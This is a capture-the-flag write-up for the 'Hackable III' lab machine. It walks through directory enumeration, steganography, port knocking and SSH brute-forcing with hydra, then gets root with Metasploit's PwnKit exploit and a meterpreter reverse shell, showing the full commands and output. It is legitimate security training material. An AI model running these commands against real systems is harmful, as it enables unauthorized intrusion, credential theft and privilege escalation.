# Hackable III Writeup
# Description
```bash
Focus on general concepts about CTF

Difficulty: Medium

This works better with VirtualBox rather than VMware.
```
# Exploitation
Let's start with a network scan
```bash
 Currently scanning: 192.168.0.111/24   |   Screen View: Unique Hosts                                                                                                                                             
                                                                                                                                                                                                                  
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                                                                                                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.104   40:65:d4:5e:e0:3e      1      60  Unknown vendor                                                                                                                                                 
 192.168.0.112   08:00:27:6a:d9:10      1      60  PCS Systemtechnik GmbH                                                                                                                                         

```
\
Next, Open Ports
```bash
80/tcp open  http    syn-ack ttl 64
```
\
Only port 80 is open
\
<img width="1580" height="760" alt="image" src="https://github.com/user-attachments/assets/449c052d-842a-4271-88c7-53aea0f47423" />
\
in the source code, there was an interesting comment
\
<img width="1510" height="175" alt="image" src="https://github.com/user-attachments/assets/9b54df09-2b14-4dd4-ba3c-4ed4037d21d9" />
\
So i ran dirb on it and got some endpoints
```bash
dirb http://192.168.0.112/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Feb 19 01:35:45 2026
URL_BASE: http://192.168.0.112/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.0.112/ ----
==> DIRECTORY: http://192.168.0.112/backup/                                                                                                                                                                       
==> DIRECTORY: http://192.168.0.112/config/                                                                                                                                                                       
==> DIRECTORY: http://192.168.0.112/css/                                                                                                                                                                          
==> DIRECTORY: http://192.168.0.112/imagens/                                                                                                                                                                      
+ http://192.168.0.112/index.html (CODE:200|SIZE:1095)                                                                                                                                                            
==> DIRECTORY: http://192.168.0.112/js/                                                                                                                                                                           
+ http://192.168.0.112/robots.txt (CODE:200|SIZE:33)                                                                                                                                                              
+ http://192.168.0.112/server-status (CODE:403|SIZE:278)                                                                                                                                                          
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.0.112/backup/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.0.112/config/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.0.112/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.0.112/imagens/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                  
---- Entering directory: http://192.168.0.112/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Thu Feb 19 01:35:48 2026
DOWNLOADED: 4612 - FOUND: 3
```
\
And since they also mentioned about a jpg file , i run gobuster with jpg extension
```bash
gobuster dir -t 100 -u http://192.168.0.112/  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x jpg -r
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.112/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              jpg
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/3.jpg                (Status: 200) [Size: 61259]
/css                  (Status: 200) [Size: 1118]
/js                   (Status: 200) [Size: 933]
/config               (Status: 200) [Size: 930]
/backup               (Status: 200) [Size: 944]
/imagens              (Status: 200) [Size: 2364]
/login_page           (Status: 200) [Size: 1522]
/server-status        (Status: 403) [Size: 278]
Progress: 441114 / 441114 (100.00%)
===============================================================
Finished
===============================================================
```
\
So finally we get these 3 files
```bash
-rw-rw-r--  1 kali kali     9 Apr 21  2021 1.txt
-rw-rw-r--  1 kali kali 61259 Apr 21  2021 3.jpg
-rw-rw-r--  1 kali kali  2335 Apr 23  2021 wordlist.txt
C:\home\kali\cysec\vulnhub\hackable> cat 1.txt            
MTAwMDA=
                                                                                                                                                                                                                   
C:\home\kali\cysec\vulnhub\hackable> cat 1.txt | base64 -d
10000
```
\
The 1.txt from /config had a number 10000 , and since the comment mentioned about port knocking 
\
So i tried port knocking but nothign happened
\
So i wanted to check something about the jpg , i thought it might have hiddden data so i use stegseek
```bash
C:\home\kali\cysec\vulnhub\hackable> stegseek -sf 3.jpg -wl /usr/share/wordlists/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "steganopayload148505.txt".
[i] Extracting to "3.jpg.out".

```
\
We get a file which has data 
```bash            
porta:65535
```
\
Then when i checked again i forgot that there was a file 2.txt under /css
```bash
cat 2.txt     
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>------------------....
```
\
It is just brainfck language , so we use an online compiler 
\
<img width="814" height="163" alt="image" src="https://github.com/user-attachments/assets/4ad294f0-4fda-496f-9b59-da0fdb9c5ec1" />
\
So now i try port knocking (it took me some time to figure out the order of ports)
```bash
 knock 192.168.0.112 10000 4444 65535 -v
hitting tcp 192.168.0.112:10000
hitting tcp 192.168.0.112:4444
hitting tcp 192.168.0.112:65535
```
\
Now we have port 22 open , and we have a wordlist and also a name from the comments "jubiscleudo"
```bash
hydra -l jubiscleudo -P wordlist.txt -t20 ssh://192.168.0.112
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-19 01:51:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 20 tasks per 1 server, overall 20 tasks, 300 login tries (l:1/p:300), ~15 tries per task
[DATA] attacking ssh://192.168.0.112:22/

[22][ssh] host: 192.168.0.112   login: jubiscleudo   password: onlymy
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 8 final worker threads did not complete until end.
[ERROR] 8 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
```
\
So i ssh with the found creds
```bash
jubiscleudo@ubuntu20:~$ id
uid=1001(jubiscleudo) gid=1001(jubiscleudo) groups=1001(jubiscleudo)
jubiscleudo@ubuntu20:~$ ls -la
total 32
drwxr-x--- 3 jubiscleudo jubiscleudo 4096 Apr 29  2021 .
drwxr-xr-x 4 root        root        4096 Apr 29  2021 ..
-rw------- 1 jubiscleudo jubiscleudo    5 Apr 29  2021 .bash_history
-rw-r--r-- 1 jubiscleudo jubiscleudo  220 Apr 29  2021 .bash_logout
-rw-r--r-- 1 jubiscleudo jubiscleudo 3771 Apr 29  2021 .bashrc
drwx------ 2 jubiscleudo jubiscleudo 4096 Apr 29  2021 .cache
-rw-r--r-- 1 jubiscleudo jubiscleudo  807 Apr 29  2021 .profile
-rw-r--r-- 1 jubiscleudo jubiscleudo 2984 Apr 27  2021 .user.txt
jubiscleudo@ubuntu20:~$ cat .user.txt 
%                                              ,%&&%#.                                              
%                                         *&&&&%%&%&&&&&&%                                          
%                                       &&&&            .%&&&                                       
%                                     &&&#                 %&&&                                     
%                                   /&&&                     &&&.                                   
%                                  %&%/                       %&&*                                  
%                                 .&&#     (%%(,     ,(&&*     %&&                                  
%                                 &&%    %&&&&&&&&&&&&&&%&%#    &&&                                 
%                                 &&%&&&&&&&   #&&&&&*   &&&&&&&%&%                                 
%                                 &&&&&&&&&&&&&&,   /&&&&&&&&&&&&&&                                 
%                                 &&&&&&&%                 &&&&&&&&                                 
%                                  %&&%&&&&              /&&&%&&&%                                  
%                                 &.%&&% %&&%           &&&& %&&/*&                                 
%                              &&&&&&&&&&  %&&&&#   %%&&&&  %&&&&&&&&&                              
%                           /&%&/   *&&&&&&   %&&&&&&%&   &&&&&&.   %&&&.                           
%                          &&&           &&%&           %%%%          .&&&                          
%                         &&%                                           &&&                         
%                        %&&.   *&%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%&&    /&&(                        
%                       /&&#   #&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&*   %&&                        
%                       &&%    ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%     %&%                       
%                      &&&      %&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&      %&&                      
%                      &&&      &&&&&&&&&&&&&&&%&   %&&&&&&&&&&&&&&&%      &&&                      
%                      %&&&%    &&&&&&&&&&&&&&&&     &&&&&&&&&&&&&&&%    &%&&#                      
%                        &&&&&&&%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&                        
%                           &%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%                           
%                                &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%                                
%                                *&%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&                                 
%                                &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%                                
%                                 #%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%( 

invite-me: https://www.linkedin.com/in/eliastouguinho/
```
\
So i was checking some directories and found this
```bash
jubiscleudo@ubuntu20:/var/www/html$ ls -la
total 124
drwxr-xr-x 8 root     root      4096 Jun 30  2021 .
drwxr-xr-x 3 root     root      4096 Apr 29  2021 ..
-rw-r--r-- 1 www-data www-data 61259 Apr 21  2021 3.jpg
drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 backup
-r-xr-xr-x 1 www-data www-data   522 Apr 29  2021 .backup_config.php
drwxr-xr-x 2 www-data www-data  4096 Apr 29  2021 config
-rw-r--r-- 1 www-data www-data   507 Apr 23  2021 config.php
drwxr-xr-x 2 www-data www-data  4096 Apr 21  2021 css
-rw-r--r-- 1 www-data www-data 11327 Jun 30  2021 home.html
drwxr-xr-x 2 www-data www-data  4096 Apr 21  2021 imagens
-rw-r--r-- 1 www-data www-data  1095 Jun 30  2021 index.html
drwxr-xr-x 2 www-data www-data  4096 Apr 20  2021 js
drwxr-xr-x 5 www-data www-data  4096 Jun 30  2021 login_page
-rw-r--r-- 1 www-data www-data   487 Apr 23  2021 login.php
-rw-r--r-- 1 www-data www-data    33 Apr 21  2021 robots.txt
jubiscleudo@ubuntu20:/var/www/html$ cat .backup_config.php 
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'hackable_3');
define('DB_PASSWORD', 'TrOLLED_3');
define('DB_NAME', 'hackable');
 
/* Attempt to connect to MySQL database */
$conexao = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);


// Check connection
if($conexao === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
} else {
}
?>
```
\
And we also have a user "hackable_3" on the machine , so i tried the password and it worked.
\
So after this i tried for quite a while 
```bash
msf auxiliary(scanner/ssh/ssh_login) > run
[*] 192.168.0.112:22 - Starting bruteforce
[+] 192.168.0.112:22 - Success: 'hackable_3:TrOLLED_3' 'uid=1000(hackable_3) gid=1000(hackable_3) groups=1000(hackable_3),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd) Linux ubuntu20 5.11.0-16-generic #17-Ubuntu SMP Wed Apr 14 20:12:43 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 1 opened (192.168.0.111:37885 -> 192.168.0.112:22) at 2026-02-19 02:31:50 -0500
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/ssh/ssh_login) > sessions -l

Active sessions
===============

  Id  Name  Type         Information  Connection
  --  ----  ----         -----------  ----------
  1         shell linux  SSH kali @   192.168.0.111:37885 -> 192.168.0.112:22 (192.168.0.112)
```
\
So i had to create a meterpreter session with ssh and then use polkit vulnerability to get root access
```bash
msf auxiliary(scanner/ssh/ssh_login) > search polkit

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/linux/local/pkexec                           2011-04-01       great      Yes    Linux PolicyKit Race Condition Privilege Escalation
   1    \_ target: Linux x86                               .                .          .      .
   2    \_ target: Linux x64                               .                .          .      .
   3  exploit/linux/local/ptrace_traceme_pkexec_helper     2019-07-04       excellent  Yes    Linux Polkit pkexec helper PTRACE_TRACEME local root exploit
   4  exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec  2022-01-25       excellent  Yes    Local Privilege Escalation in polkits pkexec
   5    \_ target: x86_64                                  .                .          .      .
   6    \_ target: x86                                     .                .          .      .
   7    \_ target: aarch64                                 .                .          .      .
   8  exploit/linux/local/polkit_dbus_auth_bypass          2021-06-03       excellent  Yes    Polkit D-Bus Authentication Bypass


Interact with a module by name or index. For example info 8, use 8 or use exploit/linux/local/polkit_dbus_auth_bypass

msf auxiliary(scanner/ssh/ssh_login) > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > show options

Module options (exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   PKEXEC_PATH                    no        The path to pkexec binary
   SESSION                        yes       The session to run this module on
   WRITABLE_DIR  /tmp             yes       A directory where we can write files


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.111    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   x86_64



View the full module info with the info, or info -d command.

msf exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > set session 1
session => 1
msf exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > run
[*] Started reverse TCP handler on 192.168.0.111:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Sending stage (3090404 bytes) to 192.168.0.112
[*] Meterpreter session 2 opened (192.168.0.111:4444 -> 192.168.0.112:48300) at 2026-02-19 02:32:28 -0500
[!] Verify cleanup of /tmp/.twauzz
[+] The target is vulnerable.
[*] Writing '/tmp/.lbhaqjfk/mxqqfsos/mxqqfsos.so' (540 bytes) ...
[!] Verify cleanup of /tmp/.lbhaqjfk
[*] Sending stage (3090404 bytes) to 192.168.0.112
[+] Deleted /tmp/.lbhaqjfk/mxqqfsos/mxqqfsos.so
[+] Deleted /tmp/.lbhaqjfk/.hxxnxq
[+] Deleted /tmp/.lbhaqjfk
[*] Meterpreter session 3 opened (192.168.0.111:4444 -> 192.168.0.112:48302) at 2026-02-19 02:32:58 -0500
msf exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > sessions -l

Active sessions
===============

  Id  Name  Type                   Information           Connection
  --  ----  ----                   -----------           ----------
  1         shell linux            SSH kali @            192.168.0.111:37885 -> 192.168.0.112:22 (192.168.0.112)
  2         meterpreter x64/linux  root @ 192.168.0.112  192.168.0.111:4444 -> 192.168.0.112:48300 (192.168.0.112)
  3         meterpreter x64/linux  root @ 192.168.0.112  192.168.0.111:4444 -> 192.168.0.112:48302 (192.168.0.112)
msf exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > sessions -i 3
[*] Starting interaction with 3...

meterpreter > shell
Process 65773 created.
Channel 1 created.
id
uid=0(root) gid=1000(hackable_3) groups=1000(hackable_3),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
cd /root
ls -la
total 48
drwx------  6 root root 4096 Jun 29  2021 .
drwxr-xr-x 21 root root 4096 Apr 29  2021 ..
-rw-------  1 root root    0 Jun 30  2021 .bash_history
-rw-r--r--  1 root root 3106 Aug 14  2019 .bashrc
drwx------  2 root root 4096 Apr 29  2021 .cache
-rw-------  1 root root   28 Jun 29  2021 .lesshst
drwxr-xr-x  3 root root 4096 Apr 29  2021 .local
-rw-r--r--  1 root root  161 Sep 16  2020 .profile
-rw-r--r--  1 root root   66 Apr 29  2021 .selected_editor
drwx------  2 root root 4096 Apr 27  2021 .ssh
-rwxr-xr-x  1 root root   46 Jun 28  2021 knockrestart.sh
-rw-------  1 root root 2768 Jun 28  2021 root.txt
drwxr-xr-x  3 root root 4096 Apr 27  2021 snap
cat roo*
░░█▀░░░░░░░░░░░▀▀███████░░░░
░░█▌░░░░░░░░░░░░░░░▀██████░░░
░█▌░░░░░░░░░░░░░░░░███████▌░░
░█░░░░░░░░░░░░░░░░░████████░░
▐▌░░░░░░░░░░░░░░░░░▀██████▌░░
░▌▄███▌░░░░▀████▄░░░░▀████▌░░
▐▀▀▄█▄░▌░░░▄██▄▄▄▀░░░░████▄▄░
▐░▀░░═▐░░░░░░══░░▀░░░░▐▀░▄▀▌▌
▐░░░░░▌░░░░░░░░░░░░░░░▀░▀░░▌▌
▐░░░▄▀░░░▀░▌░░░░░░░░░░░░▌█░▌▌
░▌░░▀▀▄▄▀▀▄▌▌░░░░░░░░░░▐░▀▐▐░
░▌░░▌░▄▄▄▄░░░▌░░░░░░░░▐░░▀▐░░
░█░▐▄██████▄░▐░░░░░░░░█▀▄▄▀░░
░▐░▌▌░░░░░░▀▀▄▐░░░░░░█▌░░░░░░
░░█░░▄▀▀▀▀▄░▄═╝▄░░░▄▀░▌░░░░░░
░░░▌▐░░░░░░▌░▀▀░░▄▀░░▐░░░░░░░
░░░▀▄░░░░░░░░░▄▀▀░░░░█░░░░░░░
░░░▄█▄▄▄▄▄▄▄▀▀░░░░░░░▌▌░░░░░░
░░▄▀▌▀▌░░░░░░░░░░░░░▄▀▀▄░░░░░
▄▀░░▌░▀▄░░░░░░░░░░▄▀░░▌░▀▄░░░
░░░░▌█▄▄▀▄░░░░░░▄▀░░░░▌░░░▌▄▄
░░░▄▐██████▄▄░▄▀░░▄▄▄▄▌░░░░▄░
░░▄▌████████▄▄▄███████▌░░░░░▄
░▄▀░██████████████████▌▀▄░░░░
▀░░░█████▀▀░░░▀███████░░░▀▄░░
░░░░▐█▀░░░▐░░░░░▀████▌░░░░▀▄░
░░░░░░▌░░░▐░░░░▐░░▀▀█░░░░░░░▀
░░░░░░▐░░░░▌░░░▐░░░░░▌░░░░░░░
░╔╗║░╔═╗░═╦═░░░░░╔╗░░╔═╗░╦═╗░
░║║║░║░║░░║░░░░░░╠╩╗░╠═╣░║░║░
░║╚╝░╚═╝░░║░░░░░░╚═╝░║░║░╩═╝░

invite-me: linkedin.com/in/eliastouguinho
```
\
The End , thank you for reading till here
